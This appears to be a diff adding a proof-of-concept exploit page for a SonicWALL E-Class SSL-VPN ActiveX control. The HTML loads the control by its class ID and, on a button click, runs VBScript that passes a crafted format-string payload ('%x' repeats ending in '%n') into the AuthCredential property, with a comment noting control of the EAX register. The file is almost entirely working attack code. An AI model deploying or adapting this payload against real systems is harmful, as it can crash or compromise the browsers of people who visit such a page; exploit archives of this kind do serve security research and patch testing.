@@ -1,0 +1,30 @@
+&lt;html&gt;
+ &lt;head&gt;
+  &lt;title&gt;SonicWALL E-Class SSL-VPN ActiveX Control DoS PoC&lt;/title&gt;
+ &lt;/head&gt;
+&lt;body&gt;
+&lt;pre&gt; 
+&lt;img src=&quot;http://sotiriu.de/images/logo_wh_80.png&quot;&gt;
+
+&lt;input type=button name=&quot;Submit&quot; VALUE=&quot;Rule #5 . Shoot First&quot;&gt;
+
+
+&lt;/pre&gt; 
+
+&lt;object classid=&#039;clsid:2A1BE1E7-C550-4D67-A553-7F2D3A39233D&#039; id=&#039;obj&#039;&gt;&lt;/object&gt;
+
+&lt;script language=&#039;vbscript&#039;&gt;
+
+Sub Submit_OnClick
+	eax=String(2, unescape(&quot;%u6161&quot;))
+	arg=&quot;%1862x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n&quot; 
+        &#039;EAX 61616161
+
+	buf=eax+arg
+
+	obj.AuthCredential = buf
+End Sub
+
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
